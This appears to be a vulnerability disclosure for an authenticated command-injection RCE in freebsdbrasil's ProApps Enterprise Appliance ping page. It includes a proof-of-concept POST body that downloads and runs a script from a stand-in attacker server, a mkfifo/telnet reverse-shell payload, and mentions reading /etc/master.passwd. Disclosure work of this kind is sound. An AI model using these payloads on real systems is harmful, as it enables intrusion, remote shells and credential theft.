# Description Item:
```
Product Vendor: freebsdbrasil
Item: ProApps - Enterprise Appliance
Editor Creator: DreamWeaver
PHP: PHP Version 7.3.18 
Java Script Library: Jquery UI 1.6 | Jquery 1.2.6
Server: NGINX
Operational System: FreeBDS Unix
```

## Vulnerability Type:
Remote Code Execution

## Description Vulnerability:
The vulnerability occurs because a user can inject system commands through the application using the ping functionality by adding a sequence command operator in Unix environments, such as (;, &&, or |).
To exploit the vulnerability it's necessary to be authenticated. The user must belong to a permission group called 'Status' and have 'Modified' Permission.
It is also important to mention that successful exploitation requires bypassing input sanitization. The application validates user input only on the front end, making it necessary to send the request through a network proxy, for example. In this way the limitations imposed by the application to be bypassed."

## Exploitation:
After authentication, it will be necessary to access a page called `sta_rede.diagnostico_ping` (http(s)://vulnerablepage.index.php?page=sta_rede.diagnostico_ping&task=view).
This page provides a function to perform an ICMP request to an arbitrary host. To learn more about the ping utility and the ICMP protocol (Request and Reply), please refer to the RFC mentioned in the references section.

The application sends a POST request with the parameters host, testar_pacote, and ttl, where `host` is the target of the ping, `testar_pacote` specifies the number of ICMP requests to send, and `TTL` is time to Live (TTL) for the packets. Upon send the request the application executes the following command on the Unix system: `ping -c $testar_pacote $host`.

This is where an attack vector is noticed. A user can exploit the vulnerability by sending a malicious POST request through a network proxy to bypass input sanitization by appending one of the sequence command operators (;, &&, or |) to the host parameter, the web application will execute the ping command mentioned above, followed by an additional command. For example, this could include reading sensitive files like `/etc/passwd`, `/etc/master.passwd` or get a reverse shell or execute arbitrary commands.

## Reverse Shell POC:
HTTP POST Request to `sta_rede.diagnostico_ping`:
`page=sta_rede.diagnostico_ping&host=x.x.x.x;curl -O http://attackserver/maliciousfile.sh; chmod +x maliciousfile.sh; ./maliciousfile.sh&testar_pacote=1&ttl=64`

### Maicious file content:
TF=$(mktemp -u);mkfifo $TF && telnet $attacker.ip $attacker.port 0<$TF | sh 1>$TF

By listening on the specified port with Netcat, a reverse shell is successfully opened.

## Impact Vulnerability:
RCE (Remote Code Execution) vulnerabilities allow an attacker to execute arbitrary code on a remote device, it can lead in a Full System Compromise, Data Breach, Lateral Movement, Malware Deployment and Reputational and Financial Damage.

### References:
- https://www.rfc-editor.org/rfc/rfc777
- https://www.checkpoint.com/cyber-hub/cyber-security/what-is-remote-code-execution-rce/
